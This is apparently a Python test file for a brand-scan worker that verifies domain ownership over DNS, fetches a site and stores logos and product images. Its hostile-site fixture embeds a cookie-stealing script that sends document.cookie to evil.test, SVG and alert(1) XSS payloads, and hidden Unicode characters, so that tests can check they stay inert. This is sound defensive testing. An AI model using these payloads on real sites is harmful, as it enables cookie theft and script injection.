"""modules/brand_scan.py and tools/brand_scan_worker.py: the brand scan job (migration 0133).

The database is a fake store that records what the worker asks it; the DNS answer is a fake verifier. The site is either
a fake (for the job's own decisions) or the real fetcher against the loopback TLS site of tests/test_brand_fetch.py, with
its attacker listener that must see zero connections. Pictures land in a temporary media root through the media
library's own store_generated (sniffed, files written, register_asset called) with a fake register.
"""

from __future__ import annotations

import io
import json
import shutil
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from modules import brand_fetch as bf
from modules import brand_scan as bs
from modules import dns_txt
from tests import test_brand_fetch as tbf
from tools import brand_scan_worker as entry

TOKEN = "0123456789abcdef0123456789abcdef"
SCAN_ID = "5d3c1f0e-1111-4222-8333-944455556666"
ORG = "0f0e0d0c-aaaa-4bbb-8ccc-ddddeeeeffff"


def setUpModule():
    tbf.setUpModule()


def tearDownModule():
    tbf.tearDownModule()


def png(colour=(255, 102, 0, 255), size=(40, 20)) -> bytes:
    from PIL import Image

    b = io.BytesIO()
    Image.new("RGBA", size, colour).save(b, "PNG")
    return b.getvalue()


class FakeStore:
    def __init__(self, checks=(), scans=()):
        self.checks, self.scans = list(checks), list(scans)
        self.calls = []
        self.finish_error = None

    def claim_check(self, worker):
        return self.checks.pop(0) if self.checks else None

    def finish_check(self, check_id, worker, ok, code):
        self.calls.append(("finish_check", check_id, ok, code))

    def claim_scan(self, worker):
        return self.scans.pop(0) if self.scans else None

    def finish_scan(self, scan_id, worker, result):
        json.dumps(result)                                   # what goes over the wire is JSON
        self.calls.append(("finish_scan", scan_id, result))
        if self.finish_error:
            raise self.finish_error

    def fail_scan(self, scan_id, worker, code):
        self.calls.append(("fail_scan", scan_id, code))


class FakeVerifier:
    def __init__(self, verdict=dns_txt.VERIFIED):
        self.verdict, self.asked = verdict, []

    def check(self, host, token):
        self.asked.append((host, token))
        return self.verdict


class FakeRegister:
    """0038's register_asset, as the media library's store calls it."""

    def __init__(self):
        self.rows = []

    def register(self, **kw):
        self.rows.append(kw)
        return {"id": kw["asset_id"]}


def job(url="https://brand-shop.test/"):
    return {"scan_id": SCAN_ID, "org_id": ORG, "url": url, "host": "brand-shop.test", "domain_host": "brand-shop.test",
            "token": TOKEN, "credits": 1}


class FakeSite:
    def __init__(self, pages=(), images=None, css=None, error=None):
        self._pages, self._images, self._css, self._error = list(pages), images or {}, css or {}, error
        self.asked = []

    def pages(self):
        if self._error:
            raise self._error
        return self._pages, []

    def image(self, url):
        self.asked.append(("image", url))
        got = self._images.get(url)
        if isinstance(got, bf.BrandFetchError):
            raise got
        if got is None:
            raise bf.BrandFetchError(bf.E_HTTP, "404")
        return bf.Fetched(url, "image/png", got, bf.IMAGE)

    def css(self, url):
        self.asked.append(("css", url))
        if url not in self._css:
            raise bf.BrandFetchError(bf.E_HTTP, "404")
        return bf.Fetched(url, "text/css", self._css[url], bf.CSS)


HOME = ("<html><head><title>Brand Shop</title><meta property='og:site_name' content='Brand Shop'>"
        "<meta name='description' content='Plain goods.'><meta name='theme-color' content='#336699'>"
        "<link rel='stylesheet' href='/a.css'><link rel='icon' href='/icon.png' sizes='64x64'>"
        "<script type='application/ld+json'>{\"@type\":\"Organization\",\"logo\":\"/logo.svg\"}</script>"
        "<script type='application/ld+json'>{\"@type\":\"Product\",\"name\":\"Mug\",\"image\":\"/mug.png\","
        "\"offers\":{\"price\":\"12\",\"priceCurrency\":\"USD\"}}</script></head><body>hi</body></html>").encode()


class Worker(unittest.TestCase):
    def setUp(self):
        self.media = Path(tempfile.mkdtemp(prefix="brand_scan_media_"))
        self.addCleanup(shutil.rmtree, self.media, True)
        self.reg = FakeRegister()
        self.opened = []

    def worker(self, store, site=None, verdict=dns_txt.VERIFIED, library=True, palette=None):
        def open_site(url):
            self.opened.append(url)
            return site
        self.verifier = FakeVerifier(verdict)
        return bs.BrandScanWorker(store, worker_id="w1", verifier=self.verifier, open_site=open_site,
                                  library=bs.Library(self.reg, self.media) if library else None,
                                  palette=palette or (lambda b: ["#112233"]), scratch=self.media)

    def site(self):
        return FakeSite([bf.Fetched("https://brand-shop.test/", "text/html", HOME, bf.HTML)],
                        images={"https://brand-shop.test/logo.svg": bf.BrandFetchError(bf.E_SVG, "svg"),
                                "https://brand-shop.test/icon.png": png(), "https://brand-shop.test/mug.png": png((1, 2, 3, 255))},
                        css={"https://brand-shop.test/a.css": b"body{font-family:'Inter',sans-serif}"})

    def test_a_check_says_what_the_record_holds(self):
        for verdict in (dns_txt.VERIFIED, dns_txt.MISMATCH, dns_txt.NO_RECORD, dns_txt.DNS_ERROR, dns_txt.TIMEOUT):
            store = FakeStore(checks=[{"check_id": "c1", "host": "brand-shop.test", "token": TOKEN}])
            w = self.worker(store, verdict=verdict)
            self.assertTrue(w.run_once())
            self.assertEqual(store.calls, [("finish_check", "c1", verdict == dns_txt.VERIFIED, verdict)])
            self.assertEqual(self.verifier.asked, [("brand-shop.test", TOKEN)])

    def test_checks_and_scans_take_turns_so_slow_dns_cannot_starve_scans(self):
        checks = [{"check_id": f"c{i}", "host": "brand-shop.test", "token": TOKEN} for i in range(5)]
        store = FakeStore(checks=checks, scans=[job(), job()])
        w = self.worker(store, self.site())
        for _ in range(4):
            self.assertTrue(w.run_once())
        kinds = [c[0] for c in store.calls]
        self.assertEqual(kinds, ["finish_check", "finish_scan", "finish_check", "finish_scan"])
        # With one queue empty the other is still served every time.
        for _ in range(3):
            self.assertTrue(w.run_once())
        self.assertEqual([c[0] for c in store.calls][4:], ["finish_check"] * 3)

    def test_nothing_to_do_is_said(self):
        self.assertFalse(self.worker(FakeStore()).run_once())

    def test_a_record_that_is_gone_fails_the_scan_before_the_site_is_touched(self):
        for verdict, code in ((dns_txt.MISMATCH, "ownership_not_proven"), (dns_txt.NO_RECORD, "ownership_not_proven"),
                              (dns_txt.DNS_ERROR, "ownership_unknown"), (dns_txt.TIMEOUT, "ownership_unknown")):
            store = FakeStore(scans=[job()])
            self.opened = []
            self.worker(store, self.site(), verdict=verdict).run_once()
            self.assertEqual(store.calls, [("fail_scan", SCAN_ID, code)])
            self.assertEqual(self.opened, [], "no request went to the site")
            self.assertEqual(self.verifier.asked, [("brand-shop.test", TOKEN)])

    def test_a_refused_home_page_fails_the_scan_with_the_fetchers_word(self):
        for code in (bf.E_ROBOTS, bf.E_NOT_PUBLIC, bf.E_TIMEOUT, bf.E_OFF_SITE, bf.E_HOSTING_PARENT):
            store = FakeStore(scans=[job()])
            self.worker(store, FakeSite(error=bf.BrandFetchError(code, "x"))).run_once()
            self.assertEqual(store.calls, [("fail_scan", SCAN_ID, f"fetch_{code}")])

    def test_a_scan_proposes_fields_with_their_sources_and_stores_pictures_in_the_library(self):
        store = FakeStore(scans=[job()])
        self.assertEqual(self.worker(store, self.site()).process_scan(store.claim_scan("w1")), "ready")
        (kind, sid, res), = store.calls
        self.assertEqual((kind, sid), ("finish_scan", SCAN_ID))
        f = res["fields"]
        self.assertEqual(f["name"], {"value": "Brand Shop", "source": {"url": "https://brand-shop.test/", "where": "og_site_name"}})
        self.assertEqual(f["description"]["value"], "Plain goods.")
        self.assertEqual(f["theme_color"]["value"], "#336699")
        self.assertEqual(f["fonts"], {"value": ["Inter"], "source": {"url": "https://brand-shop.test/a.css", "where": "css"}})
        self.assertEqual(f["palette"], {"value": ["#112233"], "source": {"url": "https://brand-shop.test/icon.png", "where": "logo_palette"}})
        # The SVG logo was refused by the fetcher; the next candidate (the icon) is the logo, stored, not linked.
        self.assertEqual(f["logo"]["source"], {"url": "https://brand-shop.test/icon.png", "where": "icon"})
        self.assertIn({"code": "logo_svg", "url": "https://brand-shop.test/logo.svg"}, res["notes"])
        logo_row = [r for r in self.reg.rows if r["provenance"]["role"] == "logo"][0]
        self.assertEqual(f["logo"]["value"], logo_row["asset_id"])
        self.assertEqual((logo_row["org"], logo_row["source"], logo_row["kind"], logo_row["mime"]), (ORG, "pipeline", "image", "image/png"))
        self.assertEqual(logo_row["provenance"], {"origin": "brand_scan", "scan_id": SCAN_ID, "role": "logo",
                                                  "from_url": "https://brand-shop.test/icon.png"})
        stored = self.media / logo_row["asset_id"][:2] / logo_row["asset_id"] / "original"
        self.assertTrue(any(p.name == "original" for p in self.media.rglob("original")), stored)
        (prod,) = res["products"]
        self.assertEqual(prod["title"]["value"], "Mug")
        self.assertEqual(prod["price"]["value"], "12 USD")
        self.assertEqual(prod["image"]["value"], [r for r in self.reg.rows if r["provenance"]["role"] == "product"][0]["asset_id"])
        self.assertNotIn("http", json.dumps([f["logo"]["value"], prod["image"]["value"]]), "an asset id, never a link")

    def test_without_a_library_no_picture_is_proposed(self):
        store = FakeStore(scans=[job()])
        self.worker(store, self.site(), library=False).run_once()
        res = store.calls[0][2]
        self.assertNotIn("logo", res["fields"])
        self.assertNotIn("image", res["products"][0])
        self.assertIn("palette", res["fields"], "the colours are read from the bytes, not from a link")

    def test_a_picture_the_library_refuses_is_left_out(self):
        site = self.site()
        site._images["https://brand-shop.test/icon.png"] = b"\x89PNG\r\n\x1a\n" + b"\x00" * 10   # PNG magic, not a picture
        store = FakeStore(scans=[job()])
        with mock.patch("modules.media_library.store_generated",
                        side_effect=__import__("modules.media_library", fromlist=["x"]).IngestReject("unsupported_type", "x")):
            self.worker(store, site).run_once()
        self.assertNotIn("logo", store.calls[0][2]["fields"])

    def test_a_result_the_database_refuses_fails_the_scan_and_a_lost_database_leaves_it(self):
        store = FakeStore(scans=[job()])
        store.finish_error = RuntimeError("finish_brand_scan: HTTP 400")
        self.worker(store, self.site()).run_once()
        self.assertEqual(store.calls[-1], ("fail_scan", SCAN_ID, "invalid_result"))
        store = FakeStore(scans=[job()])
        store.finish_error = bs.StoreUnavailable("finish_brand_scan: ConnectionError")
        self.assertEqual(self.worker(store, self.site()).process_scan(job()), "left")
        self.assertEqual([c[0] for c in store.calls], ["finish_scan"], "no fail: the stale sweep releases it")

    def test_an_unexpected_error_is_a_worker_error_and_the_worker_goes_on(self):
        store = FakeStore(scans=[job(), job()])
        w = self.worker(store, self.site(), palette=lambda b: 1 / 0)
        w.run_once()
        self.assertEqual(store.calls[-1], ("fail_scan", SCAN_ID, "worker_error"))
        self.assertTrue(w.run_once())

    def test_a_page_with_nothing_to_propose_fails_as_nothing_found(self):
        store = FakeStore(scans=[job()])
        self.worker(store, FakeSite([bf.Fetched("https://brand-shop.test/", "text/html", b"<html></html>", bf.HTML)])).run_once()
        self.assertEqual(store.calls, [("fail_scan", SCAN_ID, "nothing_found")])


class OverTheWire(tbf.Base):
    """The real fetcher against a hostile loopback site: robots honoured, an SVG logo refused, a script never a field, every
    request on the scanned site (the attacker sees nothing: tbf.Base.tearDown asserts it)."""

    def test_a_hostile_site_gives_inert_text_and_no_svg(self):
        hostile = (b"<html><head><title>&lt;script&gt;alert(1)&lt;/script&gt;\xe2\x80\xae Brand</title>"
                   b"<script>fetch('https://evil.test/'+document.cookie)</script>"
                   b"<link rel='icon' href='/logo.svg'><link rel='apple-touch-icon' href='/touch.png'>"
                   b"<link rel='icon' href='https://evil.test/x.png'><link rel='stylesheet' href='https://evil.test/a.css'>"
                   b"<script type='application/ld+json'>{\"@type\":\"Organization\",\"logo\":\"/logo2.svg\",\"name\":\"\xf3\xa0\x81\x89Brand\"}</script>"
                   b"</head><body><a href='/products/a'>a</a><a href='/private/x'>p</a></body></html>")
        self.server.on("/robots.txt", tbf.answer(200, b"User-agent: *\nDisallow: /private\n", ctype="text/plain"))
        self.server.on("/", tbf.answer(200, hostile))
        self.server.on("/products/a", tbf.answer(200, b"<html><head><meta property='og:site_name' content='Shop A'></head></html>"))
        self.server.on("/logo2.svg", tbf.answer(200, b"<svg onload='alert(1)'/>", ctype="image/svg+xml"))
        self.server.on("/touch.png", tbf.answer(200, png(), ctype="image/png"))
        store = FakeStore(scans=[job(f"https://{tbf.SITE}/")])
        media = Path(tempfile.mkdtemp(prefix="brand_scan_media_"))
        self.addCleanup(shutil.rmtree, media, True)
        reg = FakeRegister()
        w = bs.BrandScanWorker(store, worker_id="w1", verifier=FakeVerifier(),
                               open_site=lambda url: bf.SiteScan(url, _test_net=self.net()),
                               library=bs.Library(reg, media), scratch=media)
        self.assertEqual(w.run_once(), True)
        kind, _, res = store.calls[0]
        self.assertEqual(kind, "finish_scan", store.calls)
        self.assertEqual(res["fields"]["name"], {"value": "Brand", "source": {"url": f"https://{tbf.SITE}/", "where": "jsonld_organization"}},
                         "the tag-block character is gone")
        self.assertNotIn("cookie", json.dumps(res), "a script's text is never a field")
        self.assertNotIn("evil.test", json.dumps(res["fields"]))
        self.assertIn({"code": "css_off_site", "url": "https://evil.test/a.css"}, res["notes"], "named as skipped, never read")
        self.assertIn({"code": "page_robots", "url": f"https://{tbf.SITE}/private/x"}, res["notes"])
        self.assertEqual(res["fields"]["logo"]["source"]["url"], f"https://{tbf.SITE}/touch.png")
        self.assertIn({"code": "logo_svg", "url": f"https://{tbf.SITE}/logo2.svg"}, res["notes"])
        self.assertEqual(sorted(self.server.paths()), ["/", "/logo2.svg", "/products/a", "/robots.txt", "/touch.png"])
        self.assertNotIn("/private/x", self.server.paths(), "robots.txt was honoured")
        self.assertEqual(res["pages"], [f"https://{tbf.SITE}/", f"https://{tbf.SITE}/products/a"])


class Entry(unittest.TestCase):
    def test_with_the_switch_off_nothing_is_built_or_claimed(self):
        for value in (None, "", "off", "1", "true", "ON "):
            env = {} if value is None else {bs.FLAG: value}
            if value == "ON ":
                continue
            with mock.patch.object(entry, "build_worker", side_effect=AssertionError("built")):
                self.assertEqual(entry.main([], env=env), 0)
        self.assertTrue(entry.enabled({bs.FLAG: " ON "}))
        self.assertFalse(entry.enabled({}))

    def test_with_the_switch_on_and_no_key_it_exits_with_the_remedy(self):
        self.assertEqual(entry.main([], env={bs.FLAG: "on"}), 2)

    def test_once_runs_one_job(self):
        class W:
            scratch, n = None, 0

            def run_once(self):
                W.n += 1
                return True
        with mock.patch.object(entry, "build_worker", return_value=W()):
            self.assertEqual(entry.main(["--once"], env={bs.FLAG: "on"}), 0)
        self.assertEqual(W.n, 1)

    def test_the_default_verifier_is_dns_over_https_and_the_default_site_is_the_safe_fetcher(self):
        w = bs.BrandScanWorker(FakeStore(), worker_id="w")
        self.assertIs(w.open_site, bf.SiteScan)
        self.assertIsInstance(w.verifier, dns_txt.TxtVerifier)
        src = Path(bs.__file__).read_text(encoding="utf-8")
        for banned in ("import requests\n", "urllib.request", "allow_redirects", "openai", "genai", "anthropic"):
            self.assertNotIn(banned, src)


if __name__ == "__main__":
    unittest.main()
